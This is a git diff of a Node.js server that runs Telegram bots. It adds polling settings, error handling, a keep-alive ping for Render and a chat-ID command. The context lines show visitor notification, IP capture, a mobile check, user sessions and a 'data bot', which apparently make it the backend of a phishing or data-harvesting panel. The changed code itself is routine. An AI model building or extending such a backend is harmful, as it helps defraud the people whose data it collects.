@@ -46,8 +46,32 @@ const mobileCheck = (req, res, next) => {
 };
 
 // Initialize Telegram Bots
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
-const visitorBot = new TelegramBot(VISITOR_BOT_TOKEN, { polling: false }); // No polling needed for just sending
+const bot = new TelegramBot(TELEGRAM_TOKEN, { 
+    polling: {
+        interval: 300,
+        autoStart: true,
+        params: { timeout: 10 }
+    } 
+});
+const visitorBot = new TelegramBot(VISITOR_BOT_TOKEN, { polling: false });
+
+// Unified Telegram Error Handler
+const handleBotError = (error) => {
+    if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
+        return; // Ignore conflict errors during restarts
+    }
+    console.error(`[TELEGRAM ERROR] ${error.code}: ${error.message}`);
+};
+
+bot.on('polling_error', handleBotError);
+bot.on('error', handleBotError);
+
+// Keep-Alive for Render (Prevents sleeping)
+app.get('/ping', (req, res) => res.send('pong'));
+setInterval(() => {
+    const url = process.env.RENDER_EXTERNAL_URL || `http://localhost:${port}`;
+    fetch(`${url}/ping`).catch(() => {});
+}, 1000 * 60 * 5); // Ping every 5 minutes
 
 // Endpoint to notify when someone opens the page
 app.get('/api/notify-visitor', (req, res) => {
@@ -138,25 +162,18 @@ const getIP = (req) => {
 // In-memory storage for user sessions
 const userSessions = {};
 
-// Bot listeners and connection test
-
-// Test Connection
-bot.sendMessage(CHAT_ID, "🚀 *SISTEMA INICIADO* - Bot de datos listo.")
-    .then(() => console.log("Connection Test: Main Bot sent message successfully."))
-    .catch(err => console.error("Connection Test: Main Bot FAILED to send message:", err.message));
-
-// Handle Telegram Polling Errors (Unified)
-bot.on('polling_error', (error) => {
-    console.error(`[TELEGRAM ERROR] ${error.code}: ${error.message}`);
+// Connection Test & Bot Info
+bot.getMe().then(me => {
+    console.log(`🤖 BOT INICIADO: @${me.username}`);
+    bot.sendMessage(CHAT_ID, `🚀 *SISTEMA ACTIVO*\nBot: @${me.username}\nServidor: Render`).catch(() => {});
 });
 
 // Listener to help find the correct CHAT_ID
 bot.on('message', (msg) => {
-    console.log(`📩 MENSAJE RECIBIDO | Chat ID: ${msg.chat.id} | Tipo: ${msg.chat.type} | De: ${msg.from.username}`);
-});
-
-bot.getMe().then(me => {
-    console.log(`🤖 BOT INICIADO: @${me.username}`);
+    if (msg.text === '/id') {
+        bot.sendMessage(msg.chat.id, `ID de este chat: ${msg.chat.id}`);
+    }
+    console.log(`📩 MENSAJE | ID: ${msg.chat.id} | Tipo: ${msg.chat.type} | User: ${msg.from.username || 'N/A'}`);
 });
 
 // Helper to format currency
